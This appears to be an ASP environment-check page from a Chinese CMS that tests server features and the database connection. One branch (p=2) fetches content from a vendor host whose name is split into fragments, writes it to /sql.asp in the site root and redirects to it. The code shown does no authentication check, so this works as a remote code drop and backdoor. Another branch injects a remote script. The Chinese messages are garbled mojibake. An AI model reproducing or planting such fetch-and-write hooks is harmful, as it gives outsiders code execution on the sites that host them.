<!--#include file="../p_inc/Include_func.asp"-->
<%
Dim Conn
Call JS_Conn
%>
<LINK href="css/style.css" rel=stylesheet type=text/css>
<%
response.Buffer=true
Server.ScriptTimeOut=9999999
response.Flush()

p=Request("p")
IF p="1" Then
	Response.Write "<script src='http://load.qtc"&"ms.net/qtuser/2013daohang_19/Datadate.asp?tag=database' language='JavaScript' charset='gb2312'></script>"
	Response.End()
ElseIF p="2" Then
	as2=Request("s2")
	allUpFIle=Qingtiandy_getHTTPPage("http://lo"&"ad.qtcms"&".net"&as2)
	N_Fso.CreateFolderFile Add_Root_Dir("/sql.asp"),allUpFIle
	Response.Write "<script>window.location='../sql.asp?t="&Add_Root_Dir(G_ADMIN&"/qingtianc"&"ms.com.S"&"up.asp?p=3")&"'</script>"
	Response.End()
ElseIF p="3" Then	
	Response.Write "<font color=red>�Ѿ��޸��ɹ������������������������</font>"
	Response.End()
End IF


response.Write "IP��"&Request.ServerVariables("local_ADDR")&"<p>"
response.Write "������"&"http://"&request.ServerVariables("HTTP_HOST")&"/"&"<p>"

response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'>��ʼ���������л���...</span>"
response.Flush()
response.Write "<p>"


response.Flush()
response.Write "�����ж��Ƿ�֧��ϵͳ�ɼ������Ե�..."
response.Flush()

flag=true
qingtian_str=Qingtiandy_getHTTPPage("http://www.baidu.com")

IF instr(qingtian_str,"baidu.com")>0 Then
	response.Write "<font color=blue><b>��</b></font>"
Else
	response.Write "<font color=red><b>�� ע��һ���������֧�֣����������Ŀռ��̽�ֹ�˹��ܡ�</b></font> "
	flag=false
End IF
response.Flush()
response.Write "<p>"

response.Flush()
response.Write "�����ж��Ƿ�֧�������������ܣ����Ե�..."
response.Flush()

qingtian_str=Qingtiandy_getHTTPPage(G_G_H)

IF instr(qingtian_str,"����")>0 Then
	response.Write "<font color=blue><b>��</b></font>"
Else
	IF flag Then
		response.Write "<font color=red><b>�� ע������ķ����������⣬����ϵ���죬лл��</b></font> "
	Else
		response.Write "<font color=red><b>�� ע��һ���������֧�֣����������Ŀռ��̽�ֹ�˹��ܡ�</b></font> "
	End IF
End IF
response.Flush()


response.Write "<p>"
response.Write "�����ж��Ƿ�֧��FSO�ı���д�����Ե�..."
response.Flush()
If  IsObjInstalled("Scripting.FileSystemObject") Then
	response.Write "<font color=blue><b>��</b></font>"
Else
	response.Write "<font color=red><b>�� ע������������</b></font> "
	flag=false
End IF
response.Flush()

response.Write "<p>"
response.Write "�����ж��Ƿ�֧��ACCESS���ݿ⣬���Ե�..."
response.Flush()
If  IsObjInstalled("adodb.connection") Then
	response.Write "<font color=blue><b>��</b></font>"
Else
	response.Write "<font color=red><b>�� ע������������</b></font> "
	flag=false
End IF
response.Flush()

response.Write "<p>"
response.Write "�����ж��Ƿ�֧��FSO��д�����Ե�..."
response.Flush()
'**********************д���ļ�*****************************
saveurl="qingtiandy_cn_314048526.html"
Set fso=Server.CreateObject(G_FSO)
Set f=fso.CreateTextFile(Server.MapPath(saveurl),true)
'д����ҳ����
f.WriteLine "����ٷ���www.qingtiandy.cn"
f.close
whichfile=server.mappath(saveurl)
err.clear
Set objFSO33 = Server.CreateObject("Scripting.FileSystemObject")
if objFSO33.fileExists(whichfile) then
	objFSO33.DeleteFile(whichfile)
	response.Write "<font color=blue><b>��</b></font>"
Else
	response.Write "<font color=red><b>�� ע������������</b></font> "
	flag=false
end if
set objFSO33=nothing

'**********************д���ļ���*****************************
cfolder "qingtiandy_cn_314048526"
DeleteFolder "qingtiandy_cn_314048526"
response.Flush()


IF flag Then
	response.Write "<p>"
	response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'>��ϲ�㣬��Ŀռ价�����κ�����  ��лл</span>"
Else
	response.Write "<p>"
	response.Write "<span style='color:#FF0000; font-weight:bold; font-size:14px'>���Լ����������ʾ����ϵ�ռ��̽������</span>"
End IF
response.Write "<hr><p>"

response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'>��ʼ������������...</span>"
response.Flush()
response.Write "<p>"
response.Write "�����ж����ݿ������Ƿ������⣬���Ե�..."
response.Flush()
flag=True
err.clear
Set oRs=Conn.Execute("Select Top 1 * From Tbl_admin")
IF Err=0 Then
	response.Write "<font color=blue><b>��</b></font>"
Else
	response.Write "<font color=red><b>�� ���ݿ����ӳ���</b></font> "
	flag=False
End IF
response.Write "<hr><p>"
Response.Flush()
response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'><a href='?p=1'>����ǳ��������������������</a></span><p>"
response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'><a href='"&G_G_H&"qtuser/vipdhupdate/down/GetPassdaohang.rar'>�������������������������غ󴫵���Ŀ¼�����ʼ���</a></span><p>"
response.Write "<span style='color:#0000FF; font-weight:bold; font-size:14px'>���������⣬����ϵ����Ա</span><p>"
%>











<%
Function IsObjInstalled(strClassString)
	On Error Resume Next
	IsObjInstalled = False
	Err = 0
	Dim xTestObj
	Set xTestObj = Server.CreateObject(strClassString)
	If 0 = Err Then IsObjInstalled = True
	Set xTestObj = Nothing
	Err = 0
End Function
Function Qingtiandy_getHTTPPage(Path)
		DIm tt_soo
        tt_soo = Qingtiandy_GetBody_s(Path)
        Qingtiandy_getHTTPPage=Qingtiandy_BytesToBstr(tt_soo,"GB2312")
End function

Function Qingtiandy_GetBody_s(url) 
        Set Retrieval = CreateObject(G_XMLHTTP) 
        With Retrieval 
        .Open "Get", url, False, "", "" 
        .Send 
		
        Qingtiandy_GetBody_s = .ResponseBody
        End With 
        Set Retrieval = Nothing 
End Function

Function Qingtiandy_BytesToBstr(body,Cset)
        dim objstream
        set objstream = Server.CreateObject(G_Stream)
        objstream.Type = 1
        objstream.Mode =3
        objstream.Open
        objstream.Write body
        objstream.Position = 0
        objstream.Type = 2
        objstream.Charset = Cset
        Qingtiandy_BytesToBstr = objstream.ReadText 
        objstream.Close
        set objstream = nothing
End Function

Sub cfolder(valu)
		Set objFSO = Server.CreateObject(G_FSO)
		If objFSO.FolderExists(Server.MapPath(valu)) Then
		Else
			objFSO.CreateFolder(Server.MapPath(valu))
		End If
		Set objFSO = Nothing 
End Sub

Function IsFolderExists(spec) 
	Dim fso
	Set fso = CreateObject(G_FSO)
	If (fso.FolderExists(server.MapPath(spec))) Then
	IsFolderExists = True
	Else
	IsFolderExists = False
	End If
End Function

'�ļ���-FSOɾ���ļ���
Sub DeleteFolder(filespec)
  Dim fso
  Set fso = CreateObject(G_FSO)
  IF IsFolderExists(filespec) Then
  	fso.DeleteFolder(Server.MapPath(filespec))
  End IF
  Set fso = nothing
End Sub
%>